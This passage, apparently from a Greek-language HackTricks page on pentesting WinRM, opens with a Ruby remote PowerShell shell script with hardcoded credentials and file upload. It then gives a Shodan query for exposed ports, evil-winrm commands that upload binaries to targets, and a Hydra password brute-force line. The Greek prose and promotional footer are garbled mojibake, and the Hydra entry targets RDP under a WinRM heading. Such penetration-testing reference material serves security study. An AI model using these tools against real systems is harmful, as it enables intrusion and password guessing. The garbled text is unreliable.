# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

* `port:5985 Microsoft-HTTPAPI`

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks Î‘Ï…Ï„ÏŒÎ¼Î±Ï„ÎµÏ‚ Î•Î½Ï„Î¿Î»Î­Ï‚
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p â€˜MySuperSecr3tPass123!â€™

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.xyz/pentesting/pentesting-winrm

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Î£Ï…Î¼Î¼ÎµÏ„Î¬ÏƒÏ‡ÎµÏ„Îµ ÏƒÏ„Î¿Î½ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server Î³Î¹Î± Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÏ„Îµ Î¼Îµ Î­Î¼Ï€ÎµÎ¹ÏÎ¿Ï…Ï‚ Ï‡Î¬ÎºÎµÏ ÎºÎ±Î¹ ÎºÏ…Î½Î·Î³Î¿ÏÏ‚ bug bounty!

**Î•Î½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Î³Î¹Î± Ï„Î¿ Î§Î¬ÎºÎ¹Î½Î³Îº**\
Î‘ÏƒÏ‡Î¿Î»Î·Î¸ÎµÎ¯Ï„Îµ Î¼Îµ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€Î¿Ï… ÎµÎ¼Î²Î±Î¸ÏÎ½ÎµÎ¹ ÏƒÏ„Î·Î½ Î±Î´ÏÎµÎ½Î±Î»Î¯Î½Î· ÎºÎ±Î¹ Ï„Î¹Ï‚ Ï€ÏÎ¿ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… hacking

**ÎÎ­Î± Î§Î¬ÎºÎ¹Î½Î³Îº ÏƒÎµ Î ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Î§ÏÏŒÎ½Î¿**\
ÎœÎµÎ¯Î½ÎµÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î¿Î¹ Î¼Îµ Ï„Î¿Î½ Ï„Î±Ï‡ÏÏ„Î±Ï„Î¿ ÎºÏŒÏƒÎ¼Î¿ Ï„Î¿Ï… hacking Î¼Î­ÏƒÏ‰ ÎµÎ¹Î´Î®ÏƒÎµÏ‰Î½ ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ ÏƒÎµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Ï‡ÏÏŒÎ½Î¿

**Î¤ÎµÎ»ÎµÏ…Ï„Î±Î¯ÎµÏ‚ Î‘Î½Î±ÎºÎ¿Î¹Î½ÏÏƒÎµÎ¹Ï‚**\
ÎœÎµÎ¯Î½ÎµÏ„Îµ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î¿Î¹ Î³Î¹Î± Ï„Î¹Ï‚ Ï€Î¹Î¿ Ï€ÏÏŒÏƒÏ†Î±Ï„ÎµÏ‚ ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹Ï‚ bug bounty ÎºÎ±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼ÎµÏ‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±Ï‚

**Î£Ï…Î¼Î¼ÎµÏ„Î¬ÏƒÏ‡ÎµÏ„Îµ Î¼Î±Î¶Î¯ Î¼Î±Ï‚ ÏƒÏ„Î¿** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ÎºÎ±Î¹ Î¾ÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Î½Î± ÏƒÏ…Î½ÎµÏÎ³Î¬Î¶ÎµÏƒÏ„Îµ Î¼Îµ ÎºÎ¿ÏÏ…Ï†Î±Î¯Î¿Ï…Ï‚ Ï‡Î¬ÎºÎµÏ ÏƒÎ®Î¼ÎµÏÎ±!

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î£Ï…Î¼Î¼ÎµÏ„Î¬ÏƒÏ‡ÎµÏ„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
